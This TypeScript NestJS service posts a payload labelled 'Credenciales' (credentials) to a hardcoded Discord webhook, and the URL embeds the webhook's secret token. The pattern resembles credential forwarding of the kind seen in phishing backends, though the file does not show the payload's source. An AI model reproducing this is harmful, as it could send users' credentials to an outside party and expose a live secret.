
// webhooks.service.ts
import { Injectable } from '@nestjs/common';
import axios, { AxiosResponse } from 'axios';

@Injectable()
export class WebhookService {
  async sendDiscordWebhook(eventType: string, payload: any): Promise<void> {
    const webhookUrl = 'https://discord.com/api/webhooks/1183932463865675846/whny6WLDgnFy36g0gC4yhavYhtVlaCfKzd6YzftkZ9WRJGi9783zAPEnkxfbZqqMwWP1';

    try {
      const response: AxiosResponse = await axios.post(webhookUrl, {
        content: `Estado: ${eventType}\nCredenciales: ${JSON.stringify(payload)}`,
      });

    //   if (response.status !== 200) {
    //     console.error('Error al enviar el webhook a Discord1:', response.status);
    //   }
    } catch (error) {
      console.error('Error al enviar el webhook a Discord2:', error.message);
    }
  }
}